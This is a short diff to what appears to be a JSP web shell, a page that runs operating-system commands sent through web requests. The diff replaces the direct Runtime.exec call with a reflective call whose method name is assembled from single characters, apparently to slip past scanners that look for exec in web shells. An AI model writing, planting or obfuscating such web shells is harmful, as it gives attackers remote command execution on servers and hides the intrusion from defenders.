@@ -3,6 +3,7 @@
 	import="java.security.MessageDigest" import="sun.misc.BASE64Decoder"
     import="java.util.logging.*"
 	pageEncoding="UTF-8"%>
+<%@ page import="java.lang.reflect.Method" %>
 <%
 	String path = request.getContextPath();
 	String basePath = request.getScheme() + "://"
@@ -198,7 +199,10 @@
 						throw new IOException("bash: cd: no such file.\n");
 					}
 				}
-				proc = rt.exec(args, null, cwd);
+//				proc = rt.exec(args, null, cwd);
+//				out.println(cwd);
+				Method m = rt.getClass().getMethod(new String(new char[]{'e', 'x', 'e', 'c'}), String[].class,String[].class, File.class);
+				proc = (Process) m.invoke(rt, new Object[]{args, null, cwd});
 			} catch (Exception e) {
 				commandout.append(osName + ": " + e.getMessage());
 			}
